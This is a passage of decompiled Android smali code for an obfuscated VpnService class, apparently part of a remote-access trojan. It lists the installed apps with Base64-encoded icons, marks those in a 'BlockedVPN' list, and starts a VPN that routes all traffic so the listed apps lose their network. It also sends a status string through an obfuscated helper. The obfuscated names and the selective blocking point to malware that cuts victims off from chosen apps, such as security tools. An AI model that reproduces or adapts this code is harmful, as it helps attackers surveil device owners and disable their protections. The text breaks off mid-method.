.class public Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;
.super Landroid/net/VpnService;
.source "Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service.java"

# interfaces
.implements Landroid/os/Handler$Callback;
.implements Ljava/lang/Runnable;


# static fields
.field private static VPNbuilder:Landroid/net/VpnService$Builder;

.field public static iamout:Z

.field static mInterface:Landroid/os/ParcelFileDescriptor;


# instance fields
.field private final MY_VPN_NOTIFICATION_ID:I

.field private checkVpnStatusRunnable:Ljava/lang/Runnable;

.field handler:Landroid/os/Handler;


# direct methods
.method static constructor <clinit>()V
    .locals 0

    return-void
.end method

.method public constructor <init>()V
    .locals 1

    .line 40
    invoke-direct {p0}, Landroid/net/VpnService;-><init>()V

    const/16 v0, 0x65

    .line 35
    iput v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->MY_VPN_NOTIFICATION_ID:I

    .line 122
    new-instance v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service$1;

    invoke-direct {v0, p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service$1;-><init>(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;)V

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->checkVpnStatusRunnable:Ljava/lang/Runnable;

    .line 143
    new-instance v0, Landroid/os/Handler;

    invoke-direct {v0}, Landroid/os/Handler;-><init>()V

    iput-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->handler:Landroid/os/Handler;

    return-void
.end method

.method public static Load(Landroid/content/Context;)Ljava/lang/String;
    .locals 12

    .line 87
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v0

    const/4 v1, 0x0

    .line 88
    invoke-virtual {v0, v1}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object v2

    .line 89
    invoke-interface {v2}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v2

    const-string v3, ""

    :cond_0
    :goto_0
    invoke-interface {v2}, Ljava/util/Iterator;->hasNext()Z

    move-result v4

    if-eqz v4, :cond_3

    invoke-interface {v2}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v4

    check-cast v4, Landroid/content/pm/ApplicationInfo;

    .line 90
    iget-object v5, v4, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    .line 91
    invoke-virtual {p0}, Landroid/content/Context;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object v6

    invoke-virtual {v4, v6}, Landroid/content/pm/ApplicationInfo;->loadLabel(Landroid/content/pm/PackageManager;)Ljava/lang/CharSequence;

    move-result-object v6

    if-nez v6, :cond_1

    goto :goto_0

    .line 96
    :cond_1
    invoke-interface {v6}, Ljava/lang/CharSequence;->toString()Ljava/lang/String;

    move-result-object v7

    const-string v8, "."

    invoke-virtual {v7, v8}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-nez v7, :cond_0

    .line 100
    invoke-virtual {v4, v0}, Landroid/content/pm/ApplicationInfo;->loadIcon(Landroid/content/pm/PackageManager;)Landroid/graphics/drawable/Drawable;

    move-result-object v4

    .line 101
    invoke-static {v4}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/flyqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12activ;->drawableToBitmap(Landroid/graphics/drawable/Drawable;)Landroid/graphics/Bitmap;

    move-result-object v4

    const/16 v7, 0x20

    .line 102
    invoke-static {v4, v7, v7, v1}, Landroid/graphics/Bitmap;->createScaledBitmap(Landroid/graphics/Bitmap;IIZ)Landroid/graphics/Bitmap;

    move-result-object v7

    .line 104
    new-instance v8, Ljava/io/ByteArrayOutputStream;

    invoke-direct {v8}, Ljava/io/ByteArrayOutputStream;-><init>()V

    .line 105
    sget-object v9, Landroid/graphics/Bitmap$CompressFormat;->JPEG:Landroid/graphics/Bitmap$CompressFormat;

    const/16 v10, 0x46

    invoke-virtual {v7, v9, v10, v8}, Landroid/graphics/Bitmap;->compress(Landroid/graphics/Bitmap$CompressFormat;ILjava/io/OutputStream;)Z

    .line 106
    invoke-virtual {v8}, Ljava/io/ByteArrayOutputStream;->toByteArray()[B

    move-result-object v8

    .line 107
    invoke-static {v8, v1}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v8

    .line 109
    sget-object v9, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->BlockedVPN:Ljava/util/List;

    invoke-interface {v9, v5}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v9

    const-string v10, ">"

    const-string v11, ":"

    if-eqz v9, :cond_2

    .line 110
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "B:"

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    goto :goto_1

    .line 112
    :cond_2
    new-instance v9, Ljava/lang/StringBuilder;

    invoke-direct {v9}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v3, "A:"

    invoke-virtual {v9, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v11}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v9}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    .line 114
    :goto_1
    invoke-virtual {v4}, Landroid/graphics/Bitmap;->recycle()V

    .line 115
    invoke-virtual {v7}, Landroid/graphics/Bitmap;->recycle()V

    goto/16 :goto_0

    :cond_3
    return-object v3
.end method

.method static synthetic access$000(Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;)Ljava/lang/Runnable;
    .locals 0

    .line 34
    iget-object p0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->checkVpnStatusRunnable:Ljava/lang/Runnable;

    return-object p0
.end method

.method public static getLocalIpAddress()Ljava/lang/String;
    .locals 4

    .line 219
    :try_start_0
    invoke-static {}, Ljava/net/NetworkInterface;->getNetworkInterfaces()Ljava/util/Enumeration;

    move-result-object v0

    :cond_0
    invoke-interface {v0}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v1

    if-eqz v1, :cond_2

    .line 220
    invoke-interface {v0}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v1

    check-cast v1, Ljava/net/NetworkInterface;

    .line 221
    invoke-virtual {v1}, Ljava/net/NetworkInterface;->getInetAddresses()Ljava/util/Enumeration;

    move-result-object v1

    :cond_1
    invoke-interface {v1}, Ljava/util/Enumeration;->hasMoreElements()Z

    move-result v2

    if-eqz v2, :cond_0

    .line 222
    invoke-interface {v1}, Ljava/util/Enumeration;->nextElement()Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Ljava/net/InetAddress;

    .line 223
    invoke-virtual {v2}, Ljava/net/InetAddress;->isLoopbackAddress()Z

    move-result v3

    if-nez v3, :cond_1

    instance-of v3, v2, Ljava/net/Inet4Address;

    if-eqz v3, :cond_1

    .line 224
    invoke-virtual {v2}, Ljava/net/InetAddress;->getHostAddress()Ljava/lang/String;

    move-result-object v0

    const-string v1, "/"

    const-string v2, ""

    invoke-virtual {v0, v1, v2}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0
    :try_end_0
    .catch Ljava/net/SocketException; {:try_start_0 .. :try_end_0} :catch_0

    return-object v0

    :catch_0
    move-exception v0

    .line 229
    invoke-virtual {v0}, Ljava/net/SocketException;->printStackTrace()V

    :cond_2
    const/4 v0, 0x0

    return-object v0
.end method


# virtual methods
.method public StopVpn()V
    .locals 3

    .line 58
    :try_start_0
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->mInterface:Landroid/os/ParcelFileDescriptor;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    .line 59
    sput-boolean v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->iamout:Z

    .line 60
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->mInterface:Landroid/os/ParcelFileDescriptor;

    invoke-virtual {v0}, Landroid/os/ParcelFileDescriptor;->close()V

    const/4 v0, 0x0

    .line 61
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->mInterface:Landroid/os/ParcelFileDescriptor;

    .line 62
    sput-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    .line 63
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->FW:Ljava/lang/String;

    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "False"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, "!null"

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/String;->getBytes()[B

    move-result-object v1

    invoke-static {v0, v1}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->vkxpkmtknpxkyimkulrtdthirulmdzpbuczxqrvzkgbayryngh52(Ljava/lang/String;[B)V

    .line 64
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->stopSelf()V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    :catch_0
    :cond_0
    return-void
.end method

.method public handleMessage(Landroid/os/Message;)Z
    .locals 1

    if-eqz p1, :cond_0

    .line 46
    iget p1, p1, Landroid/os/Message;->what:I

    const/4 v0, 0x0

    invoke-static {p0, p1, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;II)Landroid/widget/Toast;

    move-result-object p1

    invoke-virtual {p1}, Landroid/widget/Toast;->show()V

    :cond_0
    const/4 p1, 0x1

    return p1
.end method

.method public isConnected()Z
    .locals 1

    .line 52
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->mInterface:Landroid/os/ParcelFileDescriptor;

    if-eqz v0, :cond_0

    const/4 v0, 0x1

    goto :goto_0

    :cond_0
    const/4 v0, 0x0

    :goto_0
    return v0
.end method

.method public onDestroy()V
    .locals 2

    .line 147
    invoke-super {p0}, Landroid/net/VpnService;->onDestroy()V

    .line 148
    iget-object v0, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->handler:Landroid/os/Handler;

    iget-object v1, p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->checkVpnStatusRunnable:Ljava/lang/Runnable;

    invoke-virtual {v0, v1}, Landroid/os/Handler;->removeCallbacks(Ljava/lang/Runnable;)V

    return-void
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 6

    .line 155
    sput-object p0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->MyVPN:Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;

    .line 156
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->getApplicationContext()Landroid/content/Context;

    move-result-object p2

    .line 157
    invoke-static {p2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;->getInstance(Landroid/content/Context;)Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;

    move-result-object p3

    .line 158
    invoke-virtual {p3, p2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/Notificationqlodygemmjhhoayjbpffwzgifgkhqxrsnserbwfdwynbcmakgw12Utils;->createNotification(Landroid/content/Context;)Landroid/app/Notification;

    move-result-object p2

    .line 159
    sget p3, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/eetxhixuwcsljkxwyrdaikufdwfasmmfdmjgewciljpabkjrnf4/dnudjzojlzdidztxfbjqdnpgjtebtelznciiziflazfdcgqqmz9;->NOTIFICATION_ID:I

    invoke-virtual {p0, p3, p2}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->startForeground(ILandroid/app/Notification;)V

    const/4 p2, 0x2

    if-nez p1, :cond_0

    .line 161
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->stopSelf()V

    return p2

    .line 166
    :cond_0
    new-instance p1, Landroid/net/VpnService$Builder;

    invoke-direct {p1, p0}, Landroid/net/VpnService$Builder;-><init>(Landroid/net/VpnService;)V

    sput-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    .line 172
    :try_start_0
    invoke-virtual {p1}, Landroid/net/VpnService$Builder;->allowBypass()Landroid/net/VpnService$Builder;

    move-result-object p1

    sput-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    .line 173
    sget p1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 p3, 0x1d

    const/4 v0, 0x0

    if-lt p1, p3, :cond_1

    .line 174
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    invoke-virtual {p1, v0}, Landroid/net/VpnService$Builder;->setMetered(Z)Landroid/net/VpnService$Builder;

    .line 176
    :cond_1
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->getResources()Landroid/content/res/Resources;

    move-result-object p1

    const/high16 p3, 0x7f010000

    invoke-virtual {p1, p3}, Landroid/content/res/Resources;->getStringArray(I)[Ljava/lang/String;

    move-result-object p1

    array-length p3, p1

    const/4 v1, 0x0

    :goto_0
    const/4 v2, 0x1

    if-ge v1, p3, :cond_2

    aget-object v3, p1, v1

    const-string v4, "/"

    .line 177
    invoke-virtual {v3, v4, p2}, Ljava/lang/String;->split(Ljava/lang/String;I)[Ljava/lang/String;

    move-result-object v3

    .line 178
    sget-object v4, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    aget-object v5, v3, v0

    aget-object v2, v3, v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    invoke-virtual {v4, v5, v2}, Landroid/net/VpnService$Builder;->addRoute(Ljava/lang/String;I)Landroid/net/VpnService$Builder;

    add-int/lit8 v1, v1, 0x1

    goto :goto_0

    .line 181
    :cond_2
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    invoke-static {}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->getLocalIpAddress()Ljava/lang/String;

    move-result-object p3

    const/16 v1, 0x18

    invoke-virtual {p1, p3, v1}, Landroid/net/VpnService$Builder;->addAddress(Ljava/lang/String;I)Landroid/net/VpnService$Builder;

    .line 182
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    const-string p3, "0.0.0.0"

    invoke-virtual {p1, p3, v0}, Landroid/net/VpnService$Builder;->addRoute(Ljava/lang/String;I)Landroid/net/VpnService$Builder;

    .line 184
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    const-string p3, "8.8.8.8"

    invoke-virtual {p1, p3}, Landroid/net/VpnService$Builder;->addDnsServer(Ljava/lang/String;)Landroid/net/VpnService$Builder;

    .line 185
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    const-string p3, "8.8.4.4"

    invoke-virtual {p1, p3}, Landroid/net/VpnService$Builder;->addDnsServer(Ljava/lang/String;)Landroid/net/VpnService$Builder;

    .line 186
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    const-string p3, "1.1.1.1"

    invoke-virtual {p1, p3}, Landroid/net/VpnService$Builder;->addDnsServer(Ljava/lang/String;)Landroid/net/VpnService$Builder;

    .line 187
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    const-string p3, "1.0.0.1"

    invoke-virtual {p1, p3}, Landroid/net/VpnService$Builder;->addDnsServer(Ljava/lang/String;)Landroid/net/VpnService$Builder;

    .line 188
    sget-object p1, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

    const-string p3, "VS Starting"

    invoke-virtual {p1, p3}, Landroid/net/VpnService$Builder;->setSession(Ljava/lang/String;)Landroid/net/VpnService$Builder;

    .line 190
    invoke-virtual {p0}, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->getPackageManager()Landroid/content/pm/PackageManager;

    move-result-object p1

    invoke-virtual {p1, v0}, Landroid/content/pm/PackageManager;->getInstalledApplications(I)Ljava/util/List;

    move-result-object p1

    .line 191
    invoke-interface {p1}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object p1

    :cond_3
    :goto_1
    invoke-interface {p1}, Ljava/util/Iterator;->hasNext()Z

    move-result p3

    if-eqz p3, :cond_4

    invoke-interface {p1}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object p3

    check-cast p3, Landroid/content/pm/ApplicationInfo;

    .line 192
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/aunstgpmkvyrhhhzulszqnsguszztbhsrhphzfdifobhhwfegg38;->BlockedVPN:Ljava/util/List;

    iget-object v1, p3, Landroid/content/pm/ApplicationInfo;->packageName:Ljava/lang/String;

    invoke-interface {v0, v1}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-nez v0, :cond_3

    .line 193
    sget-object v0, Lthe/alive/woyccrnuxgfcpydakidlntyufdvucxdqeifwrsotayqdhrvnrc2/gwtafhcioaolrlerzsswnnojkqvcaaijcpnwgsvumgekyzeqad3/Vpnqvuiniwbcmnydtgdnwsbbrggbhmyjgjvtkdctcdcfsqvufzltb71Service;->VPNbuilder:Landroid/net/VpnService$Builder;

